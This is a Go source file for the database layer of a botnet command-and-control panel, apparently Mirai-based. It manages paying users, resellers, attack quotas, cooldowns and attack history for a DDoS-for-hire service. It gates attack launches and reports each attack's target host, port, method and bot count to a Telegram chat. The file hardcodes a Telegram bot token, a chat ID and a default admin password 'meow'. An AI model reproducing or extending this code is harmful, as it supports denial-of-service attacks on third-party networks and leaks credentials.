package main

import (
	"database/sql"
	"errors"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/bcrypt"
)

type Database struct {
	db *sql.DB
}

type AttackOngoing struct {
	Command  string
	Duration int
	UserID   int
	Attacked int64
}

type AccountInfo struct {
	ID           int
	Username     string
	Bots         int
	Admin        bool
	Reseller     bool
	MaxAttacks   int
	TotalAttacks int
	Expiry       time.Time
	MaxTime      int
	Cooldown     int
}

func NewDatabase(dbPath string) *Database { // TODO: Rewrite entire database to work flawlessly with SQLite3
	_, err := os.Stat(dbPath)
	isNewDB := os.IsNotExist(err)

	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		log.Fatal(err)
	}

	if isNewDB {
		_, err = db.Exec(`
			CREATE TABLE IF NOT EXISTS users (
				id INTEGER PRIMARY KEY,
				username TEXT NOT NULL,
				password TEXT NOT NULL,
				max_bots INTEGER NOT NULL DEFAULT -1,
				admin INTEGER NOT NULL DEFAULT 0,
				reseller INTEGER NOT NULL DEFAULT 0,
				maxAttacks INTEGER NOT NULL DEFAULT 100,
				totalAttacks INTEGER NOT NULL DEFAULT 0,
				expiry INTEGER NOT NULL, -- Change this column type to INTEGER
				maxTime INTEGER NOT NULL DEFAULT 60,
				cooldown INTEGER NOT NULL DEFAULT 100,
				created_by TEXT NOT NULL
			);
		
			INSERT INTO users (username, password, max_bots, admin, reseller, maxAttacks, totalAttacks, expiry, maxTime, cooldown, created_by)
			VALUES ('admin', '$2a$10$wLFWk298KHMJZz9aMdUz.ufZO/iP2ZJLAI26s8QWVIC4sw6JRvqrK' , -1, 1, 0, 100, 0, strftime('%s', 'now', '+501 days'), 60, 0, 'admin');

	        CREATE TABLE IF NOT EXISTS history (
	            id INTEGER PRIMARY KEY,
	            user_id INTEGER NOT NULL,
	            time_sent INTEGER NOT NULL,
	            duration INTEGER NOT NULL,
	            command TEXT NOT NULL,
	            max_bots INTEGER DEFAULT -1,
	            FOREIGN KEY (user_id) REFERENCES users (id)
	        );

	        CREATE TABLE IF NOT EXISTS whitelist (
	            id INTEGER PRIMARY KEY,
	            prefix TEXT,
	            netmask INTEGER,
	            UNIQUE(prefix, netmask)
	        );
	    `)
		if err != nil {
			log.Fatal(err)
		}

		filename := "assets/default.credentials"

		file, err := os.OpenFile(filename, os.O_RDWR|os.O_APPEND|os.O_CREATE, 0777)
		if err != nil {
			fmt.Println(err)
		}
		defer func(file *os.File) {
			err := file.Close()
			if err != nil {

			}
		}(file)
		_, err = fmt.Fprintf(file, "Username: admin\nPassword: meow")
		if err != nil {
			return nil
		}
		err = file.Close()
		if err != nil {
			return nil
		}

		fmt.Printf("[Tbot] Successfully set up Sqlite3 with default login:\n - Username: `admin`\n - Password: `meow`\n")
	}

	fmt.Println("Database connection initiated.")
	return &Database{db}
}

func (db *Database) GetTotalAttacks(username string) (int, error) {
	var totalAttacks int

	err := db.db.QueryRow("SELECT `totalAttacks` FROM `users` WHERE `username` = ?", username).Scan(&totalAttacks)
	if err != nil {
		return 0, err
	}

	return totalAttacks, nil
}

func (db *Database) TryLogin(username string, password string, ip string) (bool, AccountInfo, error) {
	rows, err := db.db.Query("SELECT id, username, password, max_bots, admin, reseller, maxAttacks, totalAttacks, expiry FROM users WHERE username = ?", username)
	if err != nil {
		return false, AccountInfo{}, err
	}
	defer func(rows *sql.Rows) {
		err := rows.Close()
		if err != nil {

		}
	}(rows)

	var accInfo AccountInfo
	var hashedPassword string
	var timestamp int64
	var adminInt, resellerInt int

	if rows.Next() {
		err := rows.Scan(&accInfo.ID, &accInfo.Username, &hashedPassword, &accInfo.Bots, &adminInt, &resellerInt, &accInfo.MaxAttacks, &accInfo.TotalAttacks, &timestamp)
		if err != nil {
			fmt.Println(err)
			return false, AccountInfo{}, err
		}

		err = bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(password))
		if err != nil {
			fmt.Printf("Login error: %s\r\n", err)
			return false, AccountInfo{}, err
		}

		accInfo.Admin = adminInt == 1
		accInfo.Reseller = resellerInt == 1
		accInfo.Expiry = time.Unix(timestamp, 0)

		return true, accInfo, nil
	} else {
		return false, AccountInfo{}, fmt.Errorf("%s attempted to login.txt to %s, but it's invalid.\r\n", ip, username)
	}
}

func (db *Database) GetUserID(id int) (AccountInfo, error) {
	rows, err := db.db.Query("SELECT `id`, `username`, `max_bots`, `admin`, `cooldown`, `maxTime`, `expiry` FROM `users` WHERE `id` = ?", id)

	if err != nil {
		return AccountInfo{
			ID:           0,
			Username:     "",
			Bots:         0,
			Admin:        false,
			Reseller:     false,
			MaxAttacks:   0,
			TotalAttacks: 0,
			Expiry:       time.Now(),
		}, err
	}

	if !rows.Next() {
		return AccountInfo{
			ID:           0,
			Username:     "",
			Bots:         0,
			Admin:        false,
			Reseller:     false,
			MaxAttacks:   0,
			TotalAttacks: 0,
			Expiry:       time.Now(),
		}, err
	}

	var accInfo AccountInfo
	err = rows.Scan(&accInfo.ID, &accInfo.Username, &accInfo.Bots, &accInfo.Admin, &accInfo.Cooldown, &accInfo.MaxTime, &accInfo.Expiry)
	if err != nil {
		return AccountInfo{}, err
	}
	err = rows.Close()
	if err != nil {
		return AccountInfo{}, err
	}

	return accInfo, nil
}

func (db *Database) createUser(username string, password string, maxBots int, userMaxAttacks int, duration int, cooldown int, expiry int64, isAdmin bool, isReseller bool, createdBy string) bool {
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		fmt.Println(err)
		return false
	}

	_, err = db.db.Exec(`
        INSERT INTO users (username, password, max_bots, maxAttacks, maxTime, cooldown, expiry, admin, reseller, created_by)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		username,
		hashedPassword,
		maxBots,
		userMaxAttacks,
		duration,
		cooldown,
		expiry,
		isAdmin,
		isReseller,
		createdBy,
	)

	if err != nil {
		fmt.Println(err)
		return false
	}

	return true
}

func (db *Database) IncreaseTotalAttacks(username string) error {
	_, err := db.db.Exec("UPDATE users SET totalAttacks = totalAttacks + 1 WHERE username = ?", username)
	return err
}

func (db *Database) GetUserTotalAttacks(username string) (int, error) {
	var totalAttacks int
	err := db.db.QueryRow("SELECT totalAttacks FROM users WHERE username = ?", username).Scan(&totalAttacks)
	if err != nil {
		return 0, err
	}
	return totalAttacks, nil
}

func (db *Database) GetMaxAttacks(username string) (int, error) {
	var maxAttacks int
	err := db.db.QueryRow("SELECT maxAttacks FROM users WHERE username = ?", username).Scan(&maxAttacks)
	if err != nil {
		return 0, err
	}
	return maxAttacks, nil
}

func (db *Database) GetUserExpiry(username string) (time.Time, error) {
	var expiry time.Time
	err := db.db.QueryRow("SELECT expiry FROM users WHERE username = ?", username).Scan(&expiry)
	if err != nil {
		return time.Time{}, err
	}
	return expiry, nil
}

func (db *Database) changepw(newPw, username string) error {
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(newPw), bcrypt.DefaultCost)
	if err != nil {
		fmt.Println(err)
		return err
	}

	_, err = db.db.Exec("UPDATE users SET password = ? WHERE username = ?", hashedPassword, username)
	if err != nil {
		fmt.Println(err)
		return err
	}

	return nil
}

func (db *Database) CheckUserCreatedBy(username string, reseller string) bool {
	var createdBy string
	err := db.db.QueryRow("SELECT created_by FROM users WHERE username = ?", username).Scan(&createdBy)
	if err != nil {
		fmt.Println(err)
		return false
	}
	return createdBy == reseller
}

func (db *Database) getx(userid int) (string, bool) {
	var username string
	err := db.db.QueryRow("SELECT username FROM users WHERE id = ?", userid).Scan(&username)
	if err != nil {
		fmt.Println(err)
		return "", false
	}
	return username, true
}

func (db *Database) CleanLogs() bool {
	_, err := db.db.Exec("DELETE FROM history")
	if err != nil {
		fmt.Println(err)
		return false
	}
	return true
}

func (db *Database) GlobalRunning() int {
	var count int
	row := db.db.QueryRow("SELECT COUNT(*) FROM `history` WHERE  `duration` + `time_sent` > strftime('%s', 'now')")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
		return 0
	}
	return count
}

func (db *Database) RemoveUser(username string) error {
	var userID int
	err := db.db.QueryRow("SELECT id FROM users WHERE username = ?", username).Scan(&userID)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return fmt.Errorf("user '%s' not found", username)
		}
		return err
	}

	_, err = db.db.Exec("DELETE FROM users WHERE id = ?", userID)
	if err != nil {
		return err
	}

	return nil
}

func (db *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	rows, err := db.db.Query("SELECT id, maxTime, cooldown, maxAttacks, totalAttacks FROM users WHERE username = ?", username)
	defer func(rows *sql.Rows) {
		err := rows.Close()
		if err != nil {
			fmt.Println(err)
		}
	}(rows)
	if err != nil {
		fmt.Println(err)
	}
	var userId, durationLimit, cooldown, UserMaxAttacks, TotalAttacks uint32
	if !rows.Next() {
		return false, errors.New("your access has been terminated")
	}
	err = rows.Scan(&userId, &durationLimit, &cooldown, &UserMaxAttacks, &TotalAttacks)
	if err != nil {
		return false, err
	}

	if int(UserMaxAttacks) != 9999 && TotalAttacks >= UserMaxAttacks {
		return false, errors.New("max attacks reached. you cannot launch more attacks")
	}

	if durationLimit != 0 && duration > durationLimit {
		return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
	}
	err = rows.Close()
	if err != nil {
		return false, err
	}

	if allowConcurrent == 0 {
		rows, err = db.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > strftime('%s', 'now')", userId, cooldown)
		if err != nil {
			fmt.Println(err)
		}
		if rows.Next() {
			var timeSent, historyDuration uint32
			err := rows.Scan(&timeSent, &historyDuration)
			if err != nil {
				return false, err
			}
			return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}
	go func() { // lol
		logtoTelegram(fullCommand, strconv.Itoa(int(duration)), int(userId))
	}()
	_, err = db.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, strftime('%s', 'now'), ?, ?, ?)", userId, duration, fullCommand, maxBots)
	if err != nil {
		return false, err
	}
	return true, nil
}

func logtoTelegram(cmd string, duration string, userId int) { // TODO: make this project a package & put this in utils
	method, host, dport, length := parseCommand(cmd)
	bot, err := tgbotapi.NewBotAPI("6698677551:AAGa5rRZChN8SI4BjJhbhE4DYQkvfk-4yu8")
	if err != nil {
		log.Panic(err)
	}
	startedby, _ := database.getx(userId)

	now := time.Now()
	chatID := int64(-1001889307375)
	msg := tgbotapi.NewMessage(chatID, fmt.Sprintf(
		"Method:%s\n"+
			"Host: %s\n"+
			"Dport: %s\n"+
			"Duration: %s\n"+
			"Size: %s\n"+
			"BotCount: %d\n"+
			"Started: %s\n"+
			"Started by: %s",
		method, host, dport, duration, length, clientList.Count(), now.Format("2006-01-02 15:04:05"), startedby))
	_, err = bot.Send(msg)
	if err != nil {
		log.Panic(err)
	}
}

func (db *Database) Users() ([]AccountInfo, error) {
	query, err := db.db.Query("SELECT `id`,`username`, `max_bots`, `admin`, `cooldown`, `maxTime` FROM `users`")
	if err != nil { //err handles properly
		return make([]AccountInfo, 0), err
	}

	var accounts = make([]AccountInfo, 0)

	for query.Next() {
		accounts = append(accounts, AccountInfo{})
		if err := query.Scan(&accounts[len(accounts)-1].ID, &accounts[len(accounts)-1].Username, &accounts[len(accounts)-1].Bots, &accounts[len(accounts)-1].Admin, &accounts[len(accounts)-1].Cooldown, &accounts[len(accounts)-1].MaxTime); err != nil {
			return make([]AccountInfo, 0), err
		}
	}

	return accounts, nil
}

func (db *Database) Ongoing() ([]AttackOngoing, error) {
	qa, err := db.db.Query("SELECT `user_id`, `duration`, `command`, `time_sent` FROM `history` WHERE `time_sent` + `duration` > ?", time.Now().Unix())
	if err != nil { //err handles
		return make([]AttackOngoing, 0), err
	}

	var Attacking = make([]AttackOngoing, 0)

	for qa.Next() {
		Attacking = append(Attacking, AttackOngoing{})
		if err := qa.Scan(&Attacking[len(Attacking)-1].UserID, &Attacking[len(Attacking)-1].Duration, &Attacking[len(Attacking)-1].Command, &Attacking[len(Attacking)-1].Attacked); err != nil {
			return make([]AttackOngoing, 0), err
		}
	}

	return Attacking, nil
}

func parseCommand(command string) (method, host, dport, length string) { // TODO: make this project a package & put this in utils
	parts := strings.Fields(command)
	if len(parts) < 2 {
		return "", "", "65535", "512" // return default params, if this somehow happens
	}

	method = parts[0]
	host = parts[1]

	for _, part := range parts[2:] {
		if strings.HasPrefix(part, "dport=") {
			dport = strings.TrimPrefix(part, "dport=")
		}
		if strings.HasPrefix(part, "size=") {
			length = strings.TrimPrefix(part, "size=")
		}
	}

	if dport == "" {
		dport = "65535" // Mirai malware default port
	}
	if length == "" {
		length = "512" // Mirai malware default size
	}

	return method, host, dport, length
}
